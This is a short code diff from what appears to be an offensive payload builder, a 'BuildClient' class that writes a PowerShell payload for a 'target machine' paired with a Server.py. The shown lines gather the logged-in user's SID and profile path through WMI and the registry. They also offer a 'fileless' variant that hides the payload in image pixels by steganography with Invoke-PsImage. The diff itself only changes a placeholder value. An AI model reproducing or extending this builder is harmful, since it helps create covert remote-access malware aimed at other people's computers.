@@ -76,7 +76,7 @@ class BuildClient(object):
         open(pspath,'w').write(self.__genps1payload__())
         encpayload = r'''$username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1];$UserID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid;$homepath = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList\$UserID").ProfileImagePath;'''
         psim = input('To generate a fileless payload, please enter the path to the "Invoke-PsImage" script \n(if you don\'t want to use stenography enter "n"): ')
-        url = "$false"
+        url = "$null"
         if psim!='n':
             assert(os.path.isfile(psim))
             pathToImage = input('Please enter the path to an image to integrate the bytes into the pixels: ')
@@ -108,3 +108,4 @@ class BuildClient(object):
         print(f"Please run the following ({endPath}) on the target machine and run Server.py on the server.")
         
 BuildClient().genFullPayload()
+
